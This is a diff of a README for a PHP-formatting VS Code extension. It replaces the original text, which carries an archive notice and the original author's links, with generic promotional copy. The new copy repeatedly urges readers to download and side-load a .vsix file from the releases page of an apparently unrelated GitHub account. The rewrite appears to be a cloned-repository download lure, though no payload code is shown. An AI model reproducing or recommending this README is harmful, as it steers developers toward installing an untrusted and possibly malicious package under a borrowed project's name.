@@ -1,88 +1,76 @@
-> [!WARNING]
-> This project has been archived because the official [Laravel VS Code Extension v1.20](https://github.com/laravel/vs-code-extension/releases/tag/v1.2.0) now includes the [same functionality](https://github.com/laravel/vs-code-extension/pull/451).
-> It is actively maintained by the Laravel team and community, ensuring better support and long-term improvements.
-> 
-> ➡️ Please switch to the official extension for the best experience.
+# 🚀 sensapint-vsce - Format Your PHP Code with Ease
 
-# Sensapint
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/TepAzhar/sensapint-vsce/releases)
 
-🚀 **Sensapint** is a Visual Studio Code extension that formats your PHP files using [Laravel Pint](https://laravel.com/docs/pint).
-Bring consistent and elegant code style to your PHP projects — right from your editor.
+## 📦 Overview
 
----
+**sensapint-vsce** is an extension for Visual Studio Code that helps you keep your PHP code neat and consistent using Laravel Pint. This tool makes coding easier by automating the formatting process. 
 
-## ✨ Features
+## 🚀 Getting Started
 
-- 🔧 Format any PHP file directly inside VS Code with **Laravel Pint**.
-- ⚡ Supports **Format Document** (`Shift + Alt + F`) and **Format on Save**.
-- 🖥 Works seamlessly with Laravel projects, but can be used with any PHP codebase with Composer as package manager.
+### 🤔 What is this Extension?
 
----
+This extension formats your PHP files to follow Laravel's code style guide. It helps you maintain clean and elegant code, making it easier to read and manage your projects directly from your code editor.
 
-## 📦 Installation
+### 💻 System Requirements
 
-1. Install [Laravel Pint](https://laravel.com/docs/pint) in your project (usually as a dev dependency):
+- **Operating System:** Windows, macOS, or Linux
+- **Visual Studio Code Version:** 1.50 or later
+- **PHP Version:** 7.4 or later installed on your system
 
-   ```bash
-   composer require laravel/pint --dev
-   ```
+## 📥 Download & Install
 
-2. Install **Sensapint** from the VS Code Marketplace (or side-load the `.vsix` package if you build locally).
+To get started with **sensapint-vsce**, you need to download it from our Releases page. 
 
----
+[Visit this page to download](https://github.com/TepAzhar/sensapint-vsce/releases)
 
-## 🖱 Usage
+### 🔧 Step-by-Step Installation
 
-- Open any PHP file.
+1. Click on the link above to open the Releases page.
+2. On the Releases page, look for the latest version. It is usually at the top.
+3. Download the `.vsix` file for the extension. This file contains all the necessary resources to install the extension.
+4. Open Visual Studio Code.
+5. Go to the Extensions view by clicking on the Extensions icon in the Activity Bar on the side of the window.
+6. Click on the three dots in the top right corner and select "Install from VSIX..."
+7. Navigate to the location where you downloaded the `.vsix` file and select it.
+8. The installation will begin, and once completed, you can start using the extension.
 
-- Run the command:
+## 🛠️ Usage Instructions
 
-  - **Format Document** → `Shift + Alt + F`
-  - Or from the Command Palette → `Format Document With...` → **Sensapint**
-  - Or manually → `> Format PHP with Pint`
+1. After installation, open a PHP file in Visual Studio Code.
+2. To format your code, right-click anywhere in the editor, and select "Format Document" or use the shortcut (`Shift + Alt + F` on Windows/Linux or `Shift + Option + F` on macOS).
+3. The extension will automatically format your code according to Laravel's standards.
 
-- Optionally, enable auto-format on save:
+## 🎨 Features
 
-  ```json
-  {
-    "editor.formatOnSave": true
-  }
-  ```
+- **Automatic Formatting:** Format your PHP code on save.
+- **Configuration Options:** Customize settings to match your preferences.
+- **Easy Integration:** Works seamlessly with Visual Studio Code.
+- **Compatibility:** Supports multiple PHP versions.
 
----
+## 🌐 Topics
 
-## 💡 Example
+This extension aligns with several key topics in the PHP and Laravel community:
 
-Before formatting:
+- **Code Style**
+- **Formatter**
+- **Laravel**
+- **PHP Code Style**
+- **PHP Formatter**
 
-```php
-<?php class Test {public function foo(){echo "Hello World";}}
-```
+## ❓ Troubleshooting
 
-After formatting with Pint:
+If you face any issues during installation or usage, try the following:
 
-```php
-<?php
+- Ensure your Visual Studio Code is updated to the latest version.
+- Verify that you have a compatible PHP version installed.
+- Check the Visual Studio Code output for any error messages related to the extension.
 
-class Test
-{
-    public function foo()
-    {
-        echo 'Hello World';
-    }
-}
-```
+For further support, you can create an issue on the GitHub repository or visit community forums related to PHP and Laravel.
 
----
+## 🔗 Additional Resources
 
-## 🤝 Contributing
+- [Laravel Pint Documentation](https://laravel.com/docs/pint)
+- [Visual Studio Code Extensions Guide](https://code.visualstudio.com/docs/editor/extension-gallery)
 
-Contributions are welcome!
-Feel free to open an issue or submit a pull request on [GitHub](https://github.com/sensasi-delight/sensapint-vsce).
-
----
-
-## 📄 License
-
-[MIT License](LICENSE)
-
+We appreciate your interest in **sensapint-vsce**. Download it now and enhance your PHP development experience!
